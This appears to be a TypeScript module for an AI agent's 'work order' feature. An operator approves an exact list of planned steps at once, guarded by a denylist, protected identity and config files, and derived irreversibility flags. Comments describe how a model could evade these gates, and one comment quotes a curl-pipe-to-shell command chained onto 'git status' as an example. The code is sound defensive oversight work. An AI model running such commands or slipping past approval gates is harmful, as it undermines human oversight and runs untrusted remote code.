import crypto from "node:crypto";
import { config } from "./config.js";

/**
 * The work order — approve the plan once, not every step of it.
 *
 * The existing task grant (consequence.ts) helps a little and is deliberately
 * timid: it never covers a committing action and it dies at the start of the
 * next turn. So a job of any size is still a queue of cards, and the operator
 * ends up clicking through them at speed. That is not a small annoyance — it is
 * the failure this codebase already names in tools.ts: "approval fatigue is
 * itself a safety failure — when every draft on the Desk raises a card, the
 * card that says 'send £400' gets clicked on reflex."
 *
 * A work order fixes it by moving consent EARLIER rather than removing it. The
 * claw writes down exactly what it intends to do — the real commands, the real
 * paths, the real recipients — and that whole list is approved in one reading,
 * while the operator is calm and looking at the shape of the job. Then those
 * steps run without interruption.
 *
 * This is more informed consent than the card-per-step flow it replaces, not
 * less, and the safety of it rests entirely on three rules:
 *
 *   1. A step authorises ONE concrete thing. Steps are matched on the exact
 *      command, the exact path, the exact recipient — never a pattern, never a
 *      prefix. "Approved `git status`" can never come to mean `rm -rf`.
 *   2. Anything not on the list still raises a card. Drift is visible, always.
 *   3. The floor is untouched. HARD_DENY, the identity files and new standing
 *      orders cannot be pre-authorised by any plan, because those are the doors
 *      that need a hand on them every single time.
 */

export interface PlanStep {
  /** Tool this step authorises, e.g. "run_command". */
  tool: string;
  /** The exact thing: a command line, a resolved path, a recipient. */
  match: string;
  /** One line for the card, in the claw's own words. */
  summary: string;
  /** Irreversible — sends, spends, deletes, publishes. Marked on the card. */
  committing?: boolean;
  /** How many times this step may run. Defaults to once. */
  uses?: number;
}

export interface WorkOrder {
  id: string;
  title: string;
  steps: PlanStep[];
  approvedAt: number;
  expiresAt: number;
  /** step index → times already consumed */
  used: Record<number, number>;
  /** Audit trail: what actually ran under this order. */
  log: { at: number; step: number; match: string }[];
}

let current: WorkOrder | null = null;

function ttlMs(): number {
  const minutes = config.workOrder?.expiryMinutes ?? 30;
  return Math.max(1, minutes) * 60_000;
}

export function workOrderEnabled(): boolean {
  return config.workOrder?.enabled !== false;
}

/**
 * Steps a plan may never pre-authorise, whatever the operator clicks.
 *
 * A plan is a convenience over the approval card; it is not a way to reach past
 * the floor beneath it. A denied command stays denied, and the files that
 * define who the claw is keep asking every time — the same reasoning as
 * isIdentityFile in tools.ts.
 */
export function stepIsPermitted(
  step: PlanStep,
  isDenied: (command: string) => boolean,
): { ok: true } | { ok: false; why: string } {
  if (!step.tool || !step.match?.trim()) {
    return { ok: false, why: "a step must name a tool and the exact thing it does" };
  }
  if (step.tool === "run_command" && isDenied(step.match)) {
    return { ok: false, why: `"${step.match}" is on the destructive-command denylist and no plan can authorise it` };
  }
  if (step.tool === "write_file" || step.tool === "edit_file" || step.tool === "remote_copy") {
    // Not anchored to the end: a remote_copy match is a compound string
    // ("pull <local> <box>:<remote>"), so the protected name can sit in the
    // middle of it. Anchoring here let exactly that through.
    if (/(^|[/\\])(SOUL|IDENTITY|HEARTBEAT|SCHEDULE)\.md\b/i.test(step.match)) {
      return { ok: false, why: `${step.match} changes who the claw is or what it does unattended — that always asks` };
    }
    // The config holds autoApprovePatterns, allowSudo, allowReboot and
    // workOrder.enabled. A plan that could rewrite it could switch off every
    // gate above it, which makes it the one file a plan must never carry —
    // "add the forge box to the config" is far too plausible a summary.
    if (/(^|[/\\])claw\.config\.json\b/i.test(step.match)) {
      return { ok: false, why: "claw.config.json is the policy every other gate reads — no plan may pre-authorise writing it" };
    }
  }
  return { ok: true };
}

/** Build an order from proposed steps, rejecting anything a plan may not carry. */
export function prepare(
  title: string,
  steps: PlanStep[],
  // Injected rather than imported: tools.ts owns classifyCommand and imports
  // this module, so importing it back would close a tools -> workorder -> tools
  // cycle through bindings read during initialisation — the same trap the
  // schedule parser had to be split out to avoid.
  isDenied: (command: string) => boolean,
): { ok: true; order: WorkOrder } | { ok: false; error: string } {
  if (!steps.length) return { ok: false, error: "A plan needs at least one step." };
  if (steps.length > 40) return { ok: false, error: "That is too long to read in one card. Split the job." };
  for (const step of steps) {
    const verdict = stepIsPermitted(step, isDenied);
    if (!verdict.ok) return { ok: false, error: `Refused: ${verdict.why}` };
  }
  const now = Date.now();
  return {
    ok: true,
    order: {
      id: crypto.randomUUID(),
      title: title.trim() || "Untitled plan",
      steps,
      approvedAt: now,
      expiresAt: now + ttlMs(),
      used: {},
      log: [],
    },
  };
}

/**
 * Which tools are irreversible whatever the plan claims.
 *
 * `committing` is a field the MODEL fills in, and orderCard used to print
 * "Nothing here is irreversible." whenever the count was zero. A plan of
 * sends, pushes and POSTs that simply omitted the flag therefore rendered the
 * most reassuring sentence on the card — with the single most load-bearing
 * line in the whole flow under the attacker's control. Derive it here and OR
 * it with what the model said; a claim of harmlessness has to be earned.
 */
export function stepIsCommitting(step: PlanStep): boolean {
  if (step.committing) return true;
  if (["send_email", "send_chat", "home_assistant", "skill_write", "mcp_add"].includes(step.tool)) return true;
  if (step.tool === "remote_copy" && /^push\b/.test(step.match)) return true;
  if (step.tool === "http_request" && !/^GET\b/i.test(step.match)) return true;
  if (step.tool.startsWith("mcp__")) return true;
  return false;
}

/** The card body — every step spelled out, irreversible ones marked. */
export function orderCard(order: WorkOrder): string {
  const lines = order.steps.map((s, i) => {
    const mark = stepIsCommitting(s) ? "⚠ " : "  ";
    const times = (s.uses ?? 1) > 1 ? ` (up to ${s.uses}×)` : "";
    return `${mark}${i + 1}. ${s.summary}${times}\n     ${s.tool}: ${s.match}`;
  });
  const committing = order.steps.filter(stepIsCommitting).length;
  const foot = committing
    ? `\n${committing} step(s) marked ⚠ cannot be undone. Approving this plan approves those specifically.`
    : "\nNothing here is irreversible.";
  return (
    `${order.title}\n\n${lines.join("\n")}\n${foot}\n` +
    `\nApproving runs these steps without asking again. Anything else still asks. ` +
    `Expires in ${Math.round(ttlMs() / 60000)} minutes; say "cancel the plan" at any point.`
  );
}

export function activate(order: WorkOrder): void {
  current = order;
}

export function cancel(): boolean {
  const had = current !== null;
  current = null;
  return had;
}

function live(): WorkOrder | null {
  if (!current) return null;
  if (Date.now() > current.expiresAt) {
    current = null;
    return null;
  }
  return current;
}

export function status(): { active: boolean; title?: string; done?: number; total?: number; minutesLeft?: number } {
  const order = live();
  if (!order) return { active: false };
  const done = Object.values(order.used).reduce((a, b) => a + b, 0);
  const total = order.steps.reduce((a, s) => a + (s.uses ?? 1), 0);
  return {
    active: true,
    title: order.title,
    done,
    total,
    minutesLeft: Math.max(0, Math.round((order.expiresAt - Date.now()) / 60000)),
  };
}

/**
 * Does an approved step cover this exact action — and if so, spend it.
 *
 * Matching is exact on the trimmed string. Deliberately: a prefix or pattern
 * match is how "approved `git status`" quietly becomes "ran `git status && curl
 * evil | sh`". If the claw wants to run something it did not write down, that
 * is drift, and drift raises a card.
 */
export function consume(tool: string, match: string): { covered: boolean; step?: number; title?: string } {
  const order = live();
  if (!order || !workOrderEnabled()) return { covered: false };
  const want = String(match ?? "").trim();
  if (!want) return { covered: false };

  for (let i = 0; i < order.steps.length; i++) {
    const step = order.steps[i];
    if (step.tool !== tool) continue;
    if (step.match.trim() !== want) continue;
    const allowed = step.uses ?? 1;
    const spent = order.used[i] ?? 0;
    if (spent >= allowed) continue;
    order.used[i] = spent + 1;
    order.log.push({ at: Date.now(), step: i, match: want });
    return { covered: true, step: i, title: order.title };
  }
  return { covered: false };
}

/** For tests. */
export function reset(): void {
  current = null;
}
